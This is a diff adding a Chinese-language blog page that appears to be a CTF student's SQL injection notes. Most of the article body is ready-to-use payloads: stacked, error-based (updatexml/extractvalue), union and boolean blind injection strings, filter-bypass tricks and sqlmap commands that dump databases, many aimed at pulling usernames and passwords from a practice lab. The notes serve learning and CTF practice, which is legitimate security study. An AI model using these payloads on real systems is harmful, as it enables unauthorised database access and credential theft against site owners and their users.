@@ -1,0 +1,755 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Sql空格-&gt;%09 &#x3D;-&gt;like and-&gt;&amp;&amp; illegal mix of collation operation ‘UNION’ 这个错误意味着在UNION查询中的两个或多个列使用了不同的字符集或校对规则，导致无法进行正确的合并 操作。 解决方法：统一字符集和校对规则，在sql语句from前添加COLLATE utf8_general_ci s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="笔记">
+<meta property="og:url" content="http://example.com/2025/02/24/%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Sql空格-&gt;%09 &#x3D;-&gt;like and-&gt;&amp;&amp; illegal mix of collation operation ‘UNION’ 这个错误意味着在UNION查询中的两个或多个列使用了不同的字符集或校对规则，导致无法进行正确的合并 操作。 解决方法：统一字符集和校对规则，在sql语句from前添加COLLATE utf8_general_ci s">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-24T11:31:19.000Z">
+<meta property="article:modified_time" content="2025-02-24T11:33:49.466Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>笔记 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-24 19:31" pubdate>
+          2025年2月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Sql"><a href="#Sql" class="headerlink" title="Sql"></a>Sql</h1><p><strong>空格-&gt;%09</strong></p>
+<p><strong>&#x3D;-&gt;like</strong></p>
+<p><strong>and-&gt;&amp;&amp;</strong></p>
+<p><strong>illegal mix of collation operation ‘UNION’</strong></p>
+<p>这个错误意味着在UNION查询中的两个或多个列使用了不同的字符集或校对规则，导致无法进行正确的合并 操作。 解决方法：统一字符集和校对规则，在sql语句from前添加COLLATE utf8_general_ci</p>
+<p>sql语句加锁，有个提示用户只能从nss来的</p>
+<p>所以sql语句后加where user &#x3D; ‘nss’</p>
+<p>‘ - ‘ 被过滤了所以用100使前面查询不出内容，得到库名</p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a><strong>堆叠注入</strong></h2><p><strong>(emm，博客里说过滤了select就是堆叠)</strong></p>
+<p><strong>以;结束命令再在后面加命令一起执行，（这么说所有都可以用堆叠注入喽?）</strong></p>
+<p><strong>补：不是，有什么API巴拉巴拉的限制，可能不行</strong></p>
+<p><strong>命令:</strong></p>
+<p><strong>查数据库(感觉没啥用，爆表会默认当前数据库):</strong> <strong>1’; show databases;</strong></p>
+<p><strong>查表:</strong> <strong>1’; show tables;</strong></p>
+<p><strong>爆表:</strong> *<em>1’;show columns from *(*<em>表名)*;#</em></em></p>
+<p><strong>(表名为数字加<code>  </code>)</strong></p>
+<p><strong>查字段(select被禁)：</strong>[强网杯 2019]随便注1</p>
+<p><strong>1’;Handler <code>1919810931114514</code> OPEN;Handler <code>1919810931114514</code> read first;Handler <code>1919810931114514</code> close;#</strong></p>
+<p><strong>1’; handler <code>1919810931114514</code> open as a; handler a read next;#</strong></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h2><p><strong>获取数据库名</strong></p>
+<p><strong>1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</strong></p>
+<p><strong>不太稳定，嗯</strong></p>
+<p><strong>1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+</strong></p>
+<p><strong>1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+</strong></p>
+<p><strong>1’or(updatexml(1,concat(0x7e,database(),0x7e),1))#</strong></p>
+<p><strong>表</strong></p>
+<p><strong>1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+</strong></p>
+<p><strong>1’or(updatexml(1,concat(‘^’,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),’^’),1))</strong></p>
+<p><strong>若超过一行则在table_schema&#x3D;’security’后面加limit 0，1，意思是只显示第一行</strong></p>
+<p><strong>Limit 1，1   2，1   3，1往下一行看</strong></p>
+<p><strong>列</strong></p>
+<p><strong>1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+</strong></p>
+<p><strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#</strong></p>
+<p><strong>字段</strong></p>
+<p><strong>1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+       只得到了一段</strong></p>
+<p><strong>1’or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#</strong></p>
+<p>字段       表</p>
+<p><strong>1’ and extractvalue(1,concat(‘^’,(select substring(group_concat(id,’^’,flag),31,30) from test_tb)))#          第二段,31,30意思是从第31个字符往后提取30个字符，可改</strong></p>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><strong>联合注入</strong></h2><p><strong>新生赛wp(现在看应该是数字型，那为什么能直接用呢？还是说是单引号型，只是碰巧)</strong></p>
+<p><strong>先分别输入1，2，3，4，5，到5就不行了，所以有4段，再使用特定语句走流程</strong></p>
+<p><strong>查段数 1’ order by 3#</strong></p>
+<p><strong>1.</strong>   <strong>‘ union select 1,2,3 – ‘</strong></p>
+<p><strong>2.</strong>   <strong>检查数据库信息’ union select 1, 2,3， @@version – ‘</strong></p>
+<p><strong>3.</strong>   <strong>查询数据库名’ union select 1, 2,3， database() – ‘</strong></p>
+<p><strong>4.</strong>   <strong>查用户权限’ union select 1, 2, 3，user() – ‘</strong></p>
+<p><strong>5.</strong>   <strong>查表1’ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</strong> </p>
+<p><strong>6.</strong>   <strong>爆表’ union select 1, 2,3, group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctf’– ‘</strong></p>
+<p><strong>7.</strong>      </p>
+<p><strong>8.</strong>   <strong>爆列’ union select 1, 2,3, group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’ – ‘</strong></p>
+<p><strong>9.</strong>   <strong>查flag’ union select 1,2, group_concat(data) from flag– ‘</strong></p>
+<p><strong>1’ union select 1,2,group_concat(flag) from ctf.Flag</strong></p>
+<p><strong>1’ union select 1,2,group_concat(字段名) from 数据库名.表名</strong></p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h2><p><strong>刚看了布尔盲注，我勒个盲注啊，全用二分法一个个试啊，眉头一下子就皱起来了，好麻烦，很哈人，直到看到博主说：一般布尔盲注，手工去注入过于繁琐，不建议手工注入，可以借助于工具。把语句记下，去找工具了。</strong></p>
+<p><strong>1．数据库类型</strong></p>
+<p> **&#x2F;&#x2F;**<strong>判断是否是 Mysql数据库</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from information_schema.tables) –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断是否是 access数据库</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from msysobjects) –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断是否是 Sqlserver数据库</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from sysobjects) –+</strong></p>
+<p><strong>2．数据库名</strong></p>
+<p><strong>1：判断当前数据库的长度，利用二分法</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;5 –+ &#x2F;&#x2F;正常显示</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;10 –+ &#x2F;&#x2F;不显示任何数据</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;7 –+ &#x2F;&#x2F;正常显示</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length(database())&gt;8 –+ &#x2F;&#x2F;不显示任何数据</strong></p>
+<p> <strong>大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</strong></p>
+<p><strong>2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</strong></p>
+<p><strong>&#x2F;&#x2F;判断数据库的第一个字符</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr(database(),1,1))&gt;115 –+ &#x2F;&#x2F;100为ascii表中的十进制，对应字母s</strong></p>
+<p><strong>&#x2F;&#x2F;判断数据库的第二个字符</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr(database(),2,1))&gt;100 –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断数据库的第三个字符</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr(database(),3,1))&gt;100 –+</strong></p>
+<p><strong>………..</strong></p>
+<p><strong>由此可以判断出当前数据库为 security</strong></p>
+<p><strong>3．库的表名</strong></p>
+<p><strong>&#x2F;&#x2F;猜测当前数据库中是否存在admin表</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select*from admin) –+</strong></p>
+<p><strong>1：判断当前数据库中表的个数</strong></p>
+<p><strong>&#x2F;&#x2F; 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;3 –+</strong></p>
+<p><strong>2：判断每个表的长度</strong></p>
+<p><strong>&#x2F;&#x2F;判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;6 –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1))&#x3D;6 –+</strong></p>
+<p><strong>3：判断每个表的每个字符的ascii值</strong></p>
+<p><strong>&#x2F;&#x2F;判断第一个表的第一个字符的ascii值</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断第一个表的第二个字符的ascii值</strong>        </p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),2,1))&gt;100 –+</strong></p>
+<p><strong>由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</strong></p>
+<p><strong>4.表的字段</strong></p>
+<p><strong>&#x2F;&#x2F;如果已经证实了存在admin表，那么猜测是否存在username字段</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and exists(select username from admin)</strong> </p>
+<p><strong>1：判断表中字段的个数</strong></p>
+<p><strong>&#x2F;&#x2F;判断users表中字段个数是否大于5</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’)&gt;5 –+</strong></p>
+<p><strong>2：判断每个字段的长度</strong></p>
+<p><strong>&#x2F;&#x2F;判断第一个字段的长度</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1))&gt;5 –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断第二个字段的长度</strong>  </p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 1,1))&gt;5 –+</strong></p>
+<p><strong>3：判断每个字段名字的ascii值</strong></p>
+<p><strong>&#x2F;&#x2F;判断第一个字段的第一个字符的ascii</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),1,1))&gt;100 –+</strong></p>
+<p><strong>&#x2F;&#x2F;判断第一个字段的第二个字符的ascii</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1),2,1))&gt;100 –+</strong></p>
+<p><strong>………..</strong></p>
+<p><strong>由此可判断出users表中存在 id、username、password 字段</strong></p>
+<p><strong>5.字段数据</strong></p>
+<p><strong>我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据</strong></p>
+<p><strong>1: 判断数据的长度</strong></p>
+<p><strong>&#x2F;&#x2F; 判断id字段的第一个数据的长度</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select id from users limit 0,1))&gt;5 –+</strong></p>
+<p><strong>&#x2F;&#x2F; 判断id字段的第二个数据的长度</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and length((select id from users limit 1,1))&gt;5 –+</strong></p>
+<p><strong>2：判断数据的ascii值</strong></p>
+<p><strong>&#x2F;&#x2F; 判断id字段的第一行数据的第一个字符的ascii值</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select id from users limit 0,1),1,1))&gt;100 –+</strong></p>
+<p><strong>&#x2F;&#x2F; 判断id字段的第二行数据的第二个字符的ascii值</strong></p>
+<p><strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-5/?id=1">http://127.0.0.1/sqli/Less-5/?id=1</a>‘ and ascii(substr((select id from users limit 0,1),2,1))&gt;100 –+</strong></p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a><strong>时间盲注</strong></h2><p><strong>和布尔盲注差不多，布尔是直接显示对错，时间以延迟表示对错，比布尔还麻烦</strong></p>
+<h2 id="http注入"><a href="#http注入" class="headerlink" title="http注入"></a><strong>http注入</strong></h2><p><strong>只是换了个地方注入，ua，xff，cookie等</strong></p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><strong>sqlmap</strong></h2><p><strong>快速入门；SQLmap（常规）使用步骤</strong></p>
+<p><strong>1、检测「注入点」</strong></p>
+<p><strong>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘</strong></p>
+<p><strong>1</strong></p>
+<p><strong>2、查看所有「数据库」</strong></p>
+<p><strong>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs</strong></p>
+<p><strong>1</strong></p>
+<p><strong>3、查看当前使用的数据库</strong></p>
+<p><strong>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ –current-db</strong></p>
+<p><strong>1</strong></p>
+<p><strong>4、查看「数据表」</strong></p>
+<p><strong>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ –tables</strong></p>
+<p><strong>1</strong></p>
+<p><strong>5、查看「字段」</strong></p>
+<p><strong>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –tables</strong></p>
+<p><strong>1</strong></p>
+<p><strong>6、查看「数据」</strong></p>
+<p><strong>sqlmap -u ‘<a target="_blank" rel="noopener" href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ –dump</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>笔记</div>
+      <div>http://example.com/2025/02/24/笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/22/CTF%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/" title="CTF学习心得">
+                        <span class="hidden-mobile">CTF学习心得</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
